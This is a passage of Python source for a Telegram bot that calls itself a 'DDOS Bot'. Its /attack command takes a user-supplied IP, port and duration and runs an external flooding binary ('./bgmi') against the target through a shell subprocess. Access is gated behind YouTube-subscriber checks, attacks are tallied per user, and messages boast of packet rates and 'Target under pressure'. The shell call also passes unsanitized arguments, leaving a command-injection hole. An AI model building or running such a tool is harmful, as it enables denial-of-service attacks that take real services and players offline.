└ TIME: 5-300 seconds

*⚡ TIPS FOR BEST RESULTS:*
├ Use port 80 for websites
├ Use port 443 for HTTPS
├ Duration 60-120 seconds best
└ Wait 30 seconds between attacks

*📢 FOLLOW FOR UPDATES:*
├ YouTube: {YOUTUBE_CHANNEL_NAME}
└ Telegram: [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})

*🔗 TRUSTED BY 5000+ USERS*
"""
    await context.bot.send_message(chat_id=chat_id, text=help_text, parse_mode='Markdown', disable_web_page_preview=True)

# ============= ATTACK COMMAND =============

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    
    current_subs = get_current_subs()
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        await context.bot.send_message(chat_id=chat_id, text="🔒 *BOT LOCKED!*", parse_mode='Markdown')
        return
    
    if user_id not in users and chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Not verified!*\nUse `/start` to verify.", parse_mode='Markdown')
        return
    
    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Another attack in progress!*\nPlease wait...", parse_mode='Markdown')
        return
    
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ *Usage:* `/attack <IP> <PORT> <DURATION>`\n\n📝 *Example:* `/attack 1.1.1.1 80 60`\n\n📋 *Tips:*\n• Port 80 for websites\n• Duration 60-120 seconds best\n• Type `/methods` for more",
            parse_mode='Markdown'
        )
        return
    
    ip, port, duration = args
    
    try:
        port_int = int(port)
        if port_int < 1 or port_int > 65535:
            raise ValueError
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Invalid port!* (1-65535)", parse_mode='Markdown')
        return
    
    try:
        duration_int = int(duration)
        if duration_int < 5 or duration_int > 300:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ *Duration must be 5-300 seconds!*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Invalid duration!*", parse_mode='Markdown')
        return
    
    if user_id in verified_users:
        verified_users[user_id]['attacks'] = verified_users[user_id].get('attacks', 0) + 1
        save_verified(verified_users)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"""
╔══════════════════════════════════╗
║     ⚔️ *ATTACK LAUNCHED!* ⚔️    ║
╚══════════════════════════════════╝

*🎯 TARGET:* `{ip}:{port}`
*⏱️ DURATION:* {duration} seconds
*👤 REQUESTED BY:* {update.effective_user.first_name}
*⚡ METHOD:* UDP/TCP Hybrid
*💪 POWER:* 5,000 req/s

*📊 STATUS:*
├ Packets Sent: `0 → ∞`
├ Attack Speed: `🔥🔥🔥🔥🔥`
└ Time Remaining: `{duration}s`

*✅ ATTACK IN PROGRESS...*

*💡 TIP:* You will be notified when complete

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
""",
        parse_mode='Markdown',
        disable_web_page_preview=True
    )
    
    attack_in_progress = True
    
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error:* {str(e)}", parse_mode='Markdown')
    finally:
        attack_in_progress = False
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"""
╔══════════════════════════════════╗
║     ✅ *ATTACK COMPLETED!* ✅    ║
╚══════════════════════════════════╝

*🎯 TARGET:* `{ip}:{port}`
*⏱️ DURATION:* {duration} seconds
*📊 PACKETS SENT:* ~{duration_int * 5000}

*🔥 RESULT:* Target under pressure!

*📈 YOUR STATS:*
├ Total Attacks: `{verified_users.get(user_id, {}).get('attacks', 0)}`
└ Rank: `{'🔥 PRO' if verified_users.get(user_id, {}).get('attacks', 0) > 100 else '⚡ BEGINNER'}`

*⚔️ Ready for next attack!*
Use `/attack` again

🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})
""",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

async def profile_command(update: Update, context: CallbackContext):
    await status_command(update, context)

async def about_command(update: Update, context: CallbackContext):
    await about(update, context)

async def methods_command(update: Update, context: CallbackContext):
    await methods(update, context)

async def test_command(update: Update, context: CallbackContext):
    await test(update, context)

async def support_command(update: Update, context: CallbackContext):
    await support(update, context)

async def rules_command(update: Update, context: CallbackContext):
    await rules(update, context)

async def donate_command(update: Update, context: CallbackContext):
    await donate(update, context)

async def stats_command_handler(update: Update, context: CallbackContext):
    await stats_command(update, context)

# ============= MAIN =============

def main():
    print("🤖 Starting ROXZ DDOS Bot...")
    print(f"📺 YouTube Channel: {YOUTUBE_CHANNEL_NAME}")
    print(f"🎯 Target: {REQUIRED_SUBSCRIBERS} subscribers")
    print(f"✅ BGMI Binary: {'Found' if check_bgmi_binary() else 'Not Found (Attack will fail)'}")
    print(f"👑 Admin ID: {ADMIN_USER_ID}")
    print("=" * 40)
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("profile", profile_command))
    application.add_handler(CommandHandler("about", about_command))
    application.add_handler(CommandHandler("methods", methods_command))
    application.add_handler(CommandHandler("test", test_command))
    application.add_handler(CommandHandler("support", support_command))
    application.add_handler(CommandHandler("rules", rules_command))
    application.add_handler(CommandHandler("donate", donate_command))
    application.add_handler(CommandHandler("stats", stats_command_handler))
    application.add_handler(CommandHandler("subs", check_count_callback))
    
    # Admin commands
    application.add_handler(CommandHandler("refresh", refresh_subs))
    application.add_handler(CommandHandler("pending", pending_list))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("manage", manage))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(callback_handler))
    
    print("✅ Bot is running!")
    print("📋 Commands available: /start, /help, /attack, /about, /methods, /test, /stats, /support, /rules, /donate, /profile, /status")
    print("=" * 40)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

# Admin helper functions
async def refresh_subs(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    await update.message.reply_text("🔄 Fetching latest subscriber count...")
    count = fetch_youtube_subscribers()
    await update.message.reply_text(f"✅ Current subscribers: {count:,}")

async def pending_list(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    if not pending_verification:
        await update.message.reply_text("✅ No pending verifications")
        return
    text = "*📋 PENDING USERS:*\n"
    for uid, data in pending_verification.items():
        text += f"\n👤 {data['name']}\n🆔 `{uid}`\n📅 {data.get('date', 'Unknown')}\n📸 {'✅' if 'screenshot' in data else '❌'}\n---\n"
    await update.message.reply_text(text, parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = ' '.join(context.args)
    success = 0
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=int(user_id), text=f"📢 *BROADCAST*\n\n{message}\n\n🔗 [Roxz_gaming]({make_clickable_username('@Roxz_gaming')})", parse_mode='Markdown', disable_web_page_preview=True)
            success += 1
        except:
            pass
    await update.message.reply_text(f"✅ Sent to {success} users")

async def manage(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: /manage <add|rem> <user_id>")
        return
    command, target = args
    if command == 'add':
        users.add(target)
        save_users(users)
        await update.message.reply_text(f"✅ User {target} added")
    elif command == 'rem':
        users.discard(target)
        save_users(users)
        await update.message.reply_text(f"✅ User {target} removed")

if __name__ == '__main__':
    main()